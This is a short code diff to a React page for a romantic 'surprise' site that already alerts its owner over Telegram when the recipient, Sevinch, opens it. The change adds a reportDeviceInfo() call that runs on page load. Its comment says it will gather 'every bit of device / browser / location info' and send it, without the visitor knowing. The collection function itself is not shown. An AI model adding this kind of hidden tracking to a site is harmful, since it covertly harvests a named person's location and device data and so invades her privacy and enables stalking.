@@ -20,6 +20,7 @@ import Proposal from "@/components/Proposal";
 import HiddenHearts from "@/components/HiddenHearts";
 import SectionNotify from "@/components/SectionNotify";
 import { notify } from "@/lib/telegram";
+import { reportDeviceInfo } from "@/lib/deviceInfo";
 
 export default function Experience() {
   const [started, setStarted] = useState(false);
@@ -34,9 +35,11 @@ export default function Experience() {
     }
   }, []);
 
-  // Let you know the moment she opens the surprise (fires once).
+  // Let you know the moment she opens the surprise (fires once) — plus
+  // gather every bit of device / browser / location info we can and send it.
   useEffect(() => {
     notify("🌟 <b>Sevinch</b> surprise saytni ochdi.");
+    reportDeviceInfo();
   }, []);
 
   // Buttery smooth scrolling
